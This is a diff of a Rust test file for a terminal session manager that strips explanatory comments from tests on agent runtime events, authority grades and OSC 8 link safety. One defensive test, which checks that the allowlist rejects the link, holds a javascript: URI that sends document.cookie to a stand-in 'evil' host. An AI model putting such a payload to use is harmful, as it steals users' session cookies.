@@ -18,8 +18,6 @@ fn opencode_event_sets_complete_authority() {
 
 #[test]
 fn claude_event_never_sets_authority() {
-    // Decision 0a: Claude/Codex are identity-only; their events never produce
-    // a semantic authority — state comes from the screen pack + watchdog.
     let mut session = test_session_with_policy(OscPolicy::default());
     session.apply_runtime_event(
         "hook-claude-1",
@@ -86,8 +84,6 @@ fn clear_event_drops_authority_for_source() {
 
 #[test]
 fn clear_from_other_source_leaves_authority() {
-    // A Clear from a different source_id must not drop the live authority — the
-    // source guard keeps one reporter from clearing another's state.
     let mut session = test_session_with_policy(OscPolicy::default());
     let now = std::time::Instant::now();
     session.apply_runtime_event(
@@ -115,8 +111,6 @@ fn heartbeat_from_other_source_does_not_refresh_last_event() {
         t0,
     );
     let original = session.authority.as_ref().unwrap().last_event;
-    // A heartbeat (claude lifecycle event) from a different source must not
-    // refresh source-1's freshness, or a stale authority could outlive its TTL.
     session.apply_runtime_event(
         "hook-claude-9",
         "claude",
@@ -139,7 +133,6 @@ fn amp_event_sets_partial_authority() {
         std::time::Instant::now(),
     );
     let a = session.authority.as_ref().expect("amp authority set");
-    // amp has partial lifecycle coverage, so it cannot author at full confidence.
     assert_eq!(a.grade, AuthorityGrade::Partial);
 }
 
@@ -230,8 +223,6 @@ fn osc_status_partial_evidence_is_private_to_its_session() {
 
 #[test]
 fn process_evidence_unavailable_without_child_pid() {
-    // Test sessions have no real child PID; sampling must report "no physics"
-    // (never a false exit), so the watchdog can't demote off this evidence.
     let mut session = test_session_with_policy(OscPolicy::default());
     let ev = session.sample_process_evidence(std::time::Instant::now());
     assert!(!ev.physics_sampled);
@@ -319,7 +310,6 @@ fn shell_session_gets_private_paths_and_no_agent_status_identity() {
 
 #[test]
 fn osc8_uri_empty_is_safe() {
-    // Empty URI = link terminator; must always pass.
     assert!(osc8_uri_is_safe(""));
 }
 
@@ -333,7 +323,6 @@ fn osc8_uri_http_https_mailto_pass() {
 
 #[test]
 fn osc8_uri_unsafe_schemes_rejected() {
-    // The threat scenarios the allowlist is here to block.
     assert!(!osc8_uri_is_safe(
         "javascript:fetch('//evil/?'+document.cookie)"
     ));
